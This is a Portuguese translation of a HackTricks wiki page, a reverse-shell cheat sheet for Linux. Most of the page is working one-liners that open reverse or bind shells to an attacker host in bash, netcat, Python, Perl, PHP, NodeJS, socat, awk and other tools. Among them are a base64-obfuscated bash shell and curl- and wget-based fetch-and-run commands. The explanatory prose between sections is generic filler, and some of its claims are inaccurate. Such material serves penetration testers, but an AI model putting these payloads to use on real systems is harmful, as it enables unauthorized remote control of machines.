# Shells - Linux

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Se você tiver dúvidas sobre qualquer um desses shells, você pode verificá-los com** [**https://explainshell.com/**](https://explainshell.com)

## TTY Completo

**Uma vez que você obtenha um shell reverso**[ **leia esta página para obter um TTY completo**](full-ttys.md)**.**

## Bash | sh
```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```
### Shell seguro para símbolos
```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```
#### Explicação do Shell

1. **`bash -i`**: Esta parte do comando inicia um shell interativo (`-i`) do Bash.
2. **`>&`**: Esta parte do comando é uma notação abreviada para **redirecionar tanto a saída padrão** (`stdout`) **quanto o erro padrão** (`stderr`) para o **mesmo destino**.
3. **`/dev/tcp/<IP-DO-ATAQUE>/<PORTA>`**: Este é um arquivo especial que **representa uma conexão TCP com o endereço IP e porta especificados**.
   * Ao **redirecionar as saídas de saída e erro para este arquivo**, o comando envia efetivamente a saída da sessão do shell interativo para a máquina do atacante.
4. **`0>&1`**: Esta parte do comando **redireciona a entrada padrão (`stdin`) para o mesmo destino que a saída padrão (`stdout`)**.

### Criar em arquivo e executar
```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```
## Shell Avançado

Pode acontecer de você encontrar casos em que tenha um **RCE em um aplicativo da web em uma máquina Linux**, mas devido a regras do Iptables ou outros tipos de filtragem, **você não pode obter um shell reverso**. Este "shell" permite que você mantenha um shell PTY através desse RCE usando pipes dentro do sistema da vítima.\
Você pode encontrar o código em [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)

Você só precisa modificar:

* A URL do host vulnerável
* O prefixo e sufixo da sua carga útil (se houver)
* A maneira como a carga útil é enviada (cabeçalhos? dados? informações extras?)

Então, você pode apenas **enviar comandos** ou até mesmo **usar o comando `upgrade`** para obter um PTY completo (observe que os pipes são lidos e escritos com um atraso aproximado de 1,3 segundos).

## Netcat
```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## gsocket

Verifique em [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)
```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```
## Telnet

Telnet é um protocolo de rede que permite a comunicação com outro computador através da internet ou de uma rede local. Ele é frequentemente usado para acessar um shell remoto em um servidor ou dispositivo de rede. No entanto, o Telnet não é seguro, pois as informações são transmitidas em texto simples, o que significa que senhas e outras informações confidenciais podem ser facilmente interceptadas por um invasor. Por esse motivo, é recomendável usar o SSH em vez do Telnet para acessar shells remotos.
```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## Whois

**Atacante**
```bash
while true; do nc -l <port>; done
```
Para enviar o comando, escreva-o, pressione enter e pressione CTRL+D (para parar STDIN)

**Vítima**
```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```
## Python

Python é uma linguagem de programação de alto nível, interpretada e orientada a objetos. É amplamente utilizada em hacking devido à sua facilidade de uso e grande quantidade de bibliotecas disponíveis. Além disso, muitas ferramentas de hacking são escritas em Python.

Algumas das bibliotecas mais populares para hacking em Python incluem:

- **Requests**: uma biblioteca para fazer solicitações HTTP em Python.
- **BeautifulSoup**: uma biblioteca para analisar HTML e XML.
- **Scapy**: uma biblioteca para interagir com pacotes de rede.
- **Paramiko**: uma biblioteca para interagir com servidores SSH.
- **Selenium**: uma biblioteca para automatizar a interação com navegadores da web.

Python também é frequentemente usado para escrever scripts de automação de tarefas repetitivas, como varreduras de portas e testes de penetração. Além disso, muitas ferramentas de hacking populares, como o Metasploit Framework, usam Python como uma de suas linguagens de programação principais.
```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");' 
```
## Perl

Perl é uma linguagem de programação interpretada de propósito geral, originalmente desenvolvida para manipulação de texto. É uma linguagem de alto nível, dinâmica e flexível, frequentemente usada em scripts de automação e em desenvolvimento web. Perl é uma das linguagens mais populares para scripts de hacking, devido à sua capacidade de manipular facilmente arquivos e strings. Além disso, muitas ferramentas de hacking populares, como o Metasploit Framework, são escritas em Perl.
```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby

Ruby é uma linguagem de programação dinâmica, orientada a objetos e de propósito geral. É frequentemente usada para desenvolvimento web e scripting. O Ruby é conhecido por sua sintaxe simples e elegante, o que torna a escrita de código mais fácil e agradável. Além disso, o Ruby tem uma grande comunidade de desenvolvedores que criam bibliotecas e frameworks úteis para uma variedade de aplicações.
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## PHP

PHP é uma linguagem de script de código aberto amplamente utilizada para desenvolvimento web. É executada no lado do servidor e pode ser usada para criar sites dinâmicos e interativos. O PHP é compatível com a maioria dos servidores web e sistemas operacionais, tornando-o uma escolha popular para desenvolvedores web. Além disso, o PHP possui uma grande comunidade de desenvolvedores que criam bibliotecas e frameworks para facilitar o desenvolvimento de aplicativos web.
```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```
## Java

Java é uma linguagem de programação popular usada para desenvolver aplicativos em várias plataformas. É frequentemente usado em aplicativos corporativos e em desenvolvimento de software para a web. Os hackers podem explorar vulnerabilidades em aplicativos Java para obter acesso não autorizado a sistemas e dados sensíveis. Algumas técnicas comuns de hacking em Java incluem a injeção de código malicioso em aplicativos Java, a exploração de vulnerabilidades de segurança em bibliotecas Java e a engenharia reversa de aplicativos Java para encontrar vulnerabilidades. É importante manter o software Java atualizado e implementar práticas de segurança adequadas para proteger contra ataques de hackers.
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
## Ncat

Ncat é uma ferramenta de linha de comando que permite a criação de conexões TCP/IP seguras e confiáveis. Ele pode ser usado para transferir arquivos, redirecionar portas, criar backdoors e muito mais. O Ncat é uma ferramenta muito útil para hackers, pois permite a comunicação segura entre máquinas comprometidas e o atacante. Além disso, o Ncat é uma ferramenta multiplataforma, o que significa que pode ser executado em vários sistemas operacionais, incluindo Windows, Linux e macOS.
```bash
victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
attacker> ncat -v 10.0.0.22 4444 --ssl
```
## Golang

Golang é uma linguagem de programação de código aberto criada pelo Google em 2007. É uma linguagem compilada, concorrente e eficiente em termos de memória, projetada para lidar com a complexidade e a escalabilidade de aplicativos modernos. Golang é frequentemente usada para desenvolver aplicativos de rede, serviços da web, ferramentas de linha de comando e muito mais. Além disso, é uma linguagem popular para desenvolvimento de sistemas distribuídos e computação em nuvem.
```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```
## Lua

Lua é uma linguagem de programação leve, rápida e fácil de aprender. É frequentemente usada em jogos, aplicativos móveis e outras aplicações que exigem desempenho e flexibilidade. Lua é uma linguagem interpretada, o que significa que o código é executado diretamente pelo interpretador, sem a necessidade de compilação prévia. Isso torna a linguagem muito flexível e fácil de usar em uma ampla variedade de plataformas e sistemas operacionais. Além disso, Lua é altamente extensível, permitindo que os usuários adicionem facilmente novas funcionalidades e recursos à linguagem.
```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## NodeJS

NodeJS é uma plataforma de desenvolvimento de aplicações em JavaScript que permite a execução de código JavaScript no lado do servidor. Ele é amplamente utilizado para construir aplicações web escaláveis e de alta performance. Além disso, o NodeJS possui uma vasta biblioteca de módulos que podem ser facilmente integrados em projetos.
```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(8080, "10.17.26.64", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```
## OpenSSL

O Atacante (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
O Alvo
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Shell de Bind

Um shell de bind é um tipo de shell reverso que permite que um invasor se conecte a uma máquina remota através de uma porta específica. O socat é uma ferramenta que pode ser usada para criar um shell de bind. Para criar um shell de bind, primeiro é necessário escolher uma porta que não esteja sendo usada e, em seguida, executar o seguinte comando:

```
socat TCP-L:<port> EXEC:/bin/bash
```

Isso criará um shell de bind na porta especificada. O invasor pode se conectar a essa porta usando o seguinte comando:

```
socat TCP:<ip_address>:<port> -
```

Isso permitirá que o invasor se conecte ao shell de bind e execute comandos na máquina remota.
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337 
```
### Shell reverso
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
## Awk

Awk é uma ferramenta de linha de comando que permite processar e manipular dados em arquivos de texto. Ele é especialmente útil para extrair informações específicas de arquivos de log e outros tipos de arquivos de texto.

O comando básico do awk é o seguinte:

```
awk '{pattern + action}' file
```

Onde `pattern` é uma expressão regular que define o padrão a ser procurado no arquivo e `action` é o comando a ser executado quando o padrão é encontrado. Por exemplo, o seguinte comando awk imprime todas as linhas do arquivo que contêm a palavra "error":

```
awk '/error/ {print}' file
```

O awk também permite a manipulação de campos em arquivos de texto. Por padrão, o awk divide cada linha em campos separados por espaços em branco. Os campos podem ser acessados usando a variável `$n`, onde `n` é o número do campo. Por exemplo, o seguinte comando awk imprime o primeiro e o terceiro campo de cada linha do arquivo:

```
awk '{print $1, $3}' file
```

O awk também suporta operações matemáticas e lógicas, bem como loops e condicionais. Isso o torna uma ferramenta poderosa para a manipulação de dados em arquivos de texto.
```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
## Finger

**Atacante**
```bash
while true; do nc -l 79; done
```
Para enviar o comando, escreva-o, pressione enter e pressione CTRL+D (para parar STDIN)

**Vítima**
```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```
## Gawk

Gawk é uma ferramenta de processamento de texto que permite a manipulação de dados em arquivos de texto. Ele é especialmente útil para a extração de informações específicas de arquivos de log e outras fontes de dados. O Gawk é uma versão aprimorada do awk, que é uma ferramenta de processamento de texto padrão em sistemas Unix. O Gawk oferece recursos adicionais, como expressões regulares avançadas e funções incorporadas, que o tornam uma ferramenta poderosa para a análise de dados. Ele pode ser usado para filtrar, classificar, agrupar e transformar dados em arquivos de texto. O Gawk também pode ser usado para criar scripts de processamento de dados complexos e automatizar tarefas de rotina.
```bash
#!/usr/bin/gawk -f

BEGIN {
        Port    =       8080
        Prompt  =       "bkd> "

        Service = "/inet/tcp/" Port "/0/0"
        while (1) {
                do {
                        printf Prompt |& Service
                        Service |& getline cmd
                        if (cmd) {
                                while ((cmd |& getline) > 0)
                                        print $0 |& Service
                                close(cmd)
                        }
                } while (cmd != "exit")
                close(Service)
        }
}
```
## Xterm

Uma das formas mais simples de shell reverso é uma sessão xterm. O seguinte comando deve ser executado no servidor. Ele tentará se conectar de volta a você (10.0.0.1) na porta TCP 6001.
```bash
xterm -display 10.0.0.1:1
```
Para capturar o xterm de entrada, inicie um servidor X (:1 - que escuta na porta TCP 6001). Uma maneira de fazer isso é com o Xnest (a ser executado em seu sistema):
```bash
Xnest :1
```
Você precisará autorizar o alvo a se conectar a você (o comando também é executado em seu host):
```bash
xhost +targetip
```
## Groovy

por [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) NOTA: O shell reverso de Java também funciona para Groovy.
```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## Bibliografia

{% embed url="https://highon.coffee/blog/reverse-shell-cheat-sheet/" %}

{% embed url="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell" %}

{% embed url="https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
